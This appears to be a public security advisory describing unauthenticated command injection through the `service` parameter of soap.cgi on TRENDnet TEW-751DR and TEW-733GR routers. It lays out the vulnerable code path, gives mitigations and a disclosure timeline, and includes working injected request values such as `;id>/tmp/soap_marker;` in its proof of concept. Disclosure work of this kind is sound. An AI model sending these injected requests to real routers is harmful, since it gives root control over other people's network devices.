# TRENDnet TEW-751DR — Unauthenticated Command Injection in `soap.cgi` (`service` parameter)

| Field | Value |
|---|---|
| **Product** | TRENDnet TEW-751DR (N600 wireless router); TEW-733GR ships the identical `cgibin` |
| **Firmware** | 1.03B01 |
| **Platform** | MIPS32 little-endian, uClibc; UPnP HTTP service on TCP 49152 |
| **Vulnerability class** | CWE-78 — Improper Neutralization of Special Elements used in an OS Command |
| **Related weakness** | CWE-306 — Missing Authentication for Critical Function (the UPnP control plane is unauthenticated) |
| **CVSS v3.1** | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **8.8 (High)** |
| **Authentication required** | None |
| **Attack vector** | Adjacent network (UPnP control plane) |
| **Impact** | Arbitrary command execution as **root** (uid 0 in the emulation) |
| **Status** | Confirmed (dynamic: marker file created by the injected command) |
| **CVE ID** | *Submitted to VulDB on 2026-11-03 (CNA moderation pending)* |
| **Disclosure** | Public advisory (this repository); earlier copy at https://gist.github.com/qwq-nm/251e7963d59f41beea2c7ad5ff7ca39f |

> **Scope note.** The CGI was executed with the environment the vendor web server sets,
> inside a QEMU MIPS user-mode chroot, behind a small lab HTTP bridge. The bridge is not
> published; on a real device the request is a plain `POST` to TCP 49152. The injected
> command ran as uid 0 in the chroot; the uid of the CGI on a shipped device was not
> measured.

---

## 0. Repository layout

| Path | Content |
|---|---|
| `README.md` | This advisory |
| `poc/soap_service_injection.py` | Sends the control and the injected request to a device (or a lab bridge) |
| `evidence/01-replay.png` | Terminal capture of the control / listing / file runs |
| `evidence/02-raw-transcript.txt` | Full analysis plus raw harness output |
| `evidence/03-http-capture.txt` | Raw HTTP exchanges (control, `;ls;`, `;ls>pwned3;`) |

---

## 1. Summary

`/soap.cgi` is the UPnP IGD control endpoint, reachable at
`http://<device>:49152/soap.cgi`. `soapcgi_main` (`0x40e2b0` in `htdocs/cgibin`) takes the
`service` query value and concatenates it into a shell command without any validation:

```c
/* roughly */
sprintf(buf, "sh /var/run/%s_%d.sh > /dev/console &", service, getpid());
system(buf);
```

`service` is not restricted to an enum, and the CGI performs no session or credential
check (unlike the other web CGIs in the same binary, which call `sess_ispvalidate()` /
`sess_ispoweruser()`). A single unauthenticated request therefore executes arbitrary
commands as the CGI user, which is root on these devices.

## 2. Affected components

| Item | Value |
|---|---|
| Firmware image SHA-256 | `fe1168fc2b2bf4744df3a7145eeaf11b2c5272ae502c8f2993e5c614499322ec` |
| `htdocs/cgibin` SHA-256 | `e27547940d0ae75233fc6b2b64c50d37fc3b55d4dea9d86bbb86dd448f08a7eb` (byte-identical on TEW-751DR and TEW-733GR) |
| Vulnerable function | `soapcgi_main @ 0x40e2b0` |
| Sink | `system("sh /var/run/<service>_<pid>.sh > /dev/console &")` |
| Firmware download | `https://download.trendnet.com/TEW-751DR/firmware/TEW-751DRv1_(FW1.03B01).zip` |

TEW-733GR 1.03B01 ships the same `cgibin` (same SHA-256). TEW-752DRU 1.03B01 has a
different `cgibin`; the same sink was found there by decompilation (`soapcgi_main`
equivalent), but it is tracked separately and is not claimed as dynamically reproduced
in this entry.

## 3. Technical details

### 3.1 Path

```text
POST /soap.cgi?service=<value>          (no authentication)
  → cgibin :: soapcgi_main @ 0x40e2b0
      getenv("QUERY_STRING") → after "service="
      sprintf(buf, "sh /var/run/%s_%d.sh > /dev/console &", value, getpid());
      system(buf);                       ← sink
```

The only guard on the SOAP path is a lock file (`/var/run/soap.lock`); there is no
`service` whitelist, so `;`, `|`, `&` and redirections all reach the shell.

### 3.2 Observed behaviour

| Request | Result |
|---|---|
| `service=OSInfo1` (control) | `HTTP/1.1 200 OK`, no file created |
| `service=OSInfo1;ls;` | directory listing of `/` appears on the CGI stdout |
| `service=OSInfo1;ls>pwned3;` | `pwned3` created, `root:root 644`, 94 bytes |

The listing can appear **before** the CGI's own status line because the child writes to
fd 1 while the CGI header sits in a buffered stream. A strict HTTP server may therefore
not relay the command output to the client; the file side effect is the reliable proof,
and blind execution is the conservative reading.

### 3.3 Verification status

- **Dynamically confirmed**: the vendor CGI, executed in a QEMU MIPS chroot with the
  CGI environment, ran the injected command and created the marker file.
- **Not done**: a request against physical hardware, and the vendor `httpd` front-end
  (the lab used a minimal HTTP bridge). The uid was measured in the chroot only.

## 4. Proof of concept

```bash
# control + injection against a device (or a lab bridge listening on 49152)
TARGET=http://192.168.10.1:49152 python3 poc/soap_service_injection.py
```

The script sends two requests and reports whether the marker file could be observed:

```http
POST /soap.cgi?service=OSInfo1;id>/tmp/soap_marker; HTTP/1.1
Host: 192.168.10.1:49152
Content-Type: text/xml
SOAPAction: "urn:schemas-upnp-org:service:OSInfo:1#GetInfo"
Content-Length: 0
```

Against a device, verify the side effect over an independent channel (for example the
same shell that created it is not available, so use a follow-up request that reads the
file, or inspect the device). The published PoC only builds and sends the request — it
does not exploit beyond creating a marker file.

## 5. Impact

- Unauthenticated command execution as root on the LAN segment; full device compromise
  follows (configuration read-out, persistence, traffic control).
- Because the input is the UPnP `service` query value, any filtering that only inspects
  the SOAP body or the `SOAPAction` header misses it.

## 6. Existing CVEs and differences

No public advisory was located for `/soap.cgi?service=` on the 1.03B01 firmware line
(search date 2026-11-03). The `/gena.cgi` CALLBACK injection and the `/wfadev.cgi`
overflow in the same firmware are separate defects with different inputs and sinks, and
are reported separately.

## 7. Mitigation

- Treat `service` as an enum: accept only names for which `ACTION.<name>.php` exists,
  reject everything else with 400.
- Stop building shell command lines from request data; use `execv()` with an argv array.
- Require an authenticated UPnP session for control endpoints, and disable the UPnP
  control plane when it is not needed.

## 8. Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-30 | Static analysis of `soapcgi_main`; command execution reproduced in emulation |
| 2026-10-31 | HTTP capture of control / listing / file side effect |
| 2026-11-03 | CVE requested via VulDB (vendor/CNA channel) |
| 2026-11-03 | Submitted to VulDB (CNA channel); moderation pending |
| 2026-11-03 | Public advisory published here |

## 9. Notes on scope and integrity

- Emulation only; the HTTP front-end was a lab bridge, not the vendor `httpd`.
- No credential, persistence mechanism or turnkey payload is published; the PoC writes a
  marker file.
- No personal information is included.

## 10. References

- Vendor: TRENDnet — https://www.trendnet.com
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
